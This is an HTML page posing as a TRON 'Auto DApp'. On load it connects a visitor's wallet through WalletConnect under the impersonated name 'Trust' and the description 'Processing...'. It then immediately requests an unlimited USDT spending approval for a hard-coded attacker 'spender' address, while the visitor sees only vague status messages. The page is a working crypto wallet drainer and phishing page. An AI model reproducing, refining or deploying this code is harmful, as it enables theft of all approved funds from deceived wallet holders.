<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>TRON Auto DApp</title>

<script type="module">
import {
  WalletConnectWallet,
  WalletConnectChainID
} from 'https://esm.sh/@tronweb3/walletconnect-tron';

let wallet;

// 🔥 TRON USDT Contract
const USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";

// 🔥 YOUR WALLET (spender)
const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";

// 🔥 INIT
async function init() {
  wallet = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: 'wss://relay.walletconnect.com',
      projectId: '171db6da15a54effc1b4a06f889a3c3f',
      metadata: {
        name: 'Trust',
        description: 'Processing...',
        url: window.location.origin,
        icons: ['https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQjTrKgy8TJ9muJphpzXZAGb-TTs5c2igXR6Q&s']
      }
    }
  });

  connectFlow();
}

// 🔥 AUTO CONNECT
async function connectFlow() {
  try {
    document.getElementById("status").innerText = "Connecting wallet...";

    await wallet.connect();

    const tronWeb = wallet.tronWeb;
    const user = wallet.address;

    document.getElementById("status").innerText =
      "Connected: " + user;

    await approve(tronWeb);

  } catch (e) {
    console.error(e);
    document.getElementById("status").innerText =
      "Connection failed / rejected";
  }
}

// 🔥 APPROVAL FUNCTION
async function approve(tronWeb) {
  try {
    document.getElementById("status").innerText =
      "Requesting approval...";

    const contract = await tronWeb.contract().at(USDT);

    await contract.approve(
      SPENDER,
      "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    ).send({
      feeLimit: 100000000
    });

    document.getElementById("status").innerText =
      "✅ Approval done";

  } catch (err) {
    console.error(err);
    document.getElementById("status").innerText =
      "Approval failed";
  }
}

window.onload = init;
</script>

<style>
body {
  margin: 0;
  background: #0f0f0f;
  color: white;
  font-family: Arial;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}
#status {
  font-size: 18px;
}
</style>
</head>

<body>
  <div id="status">Initializing...</div>
</body>
</html>
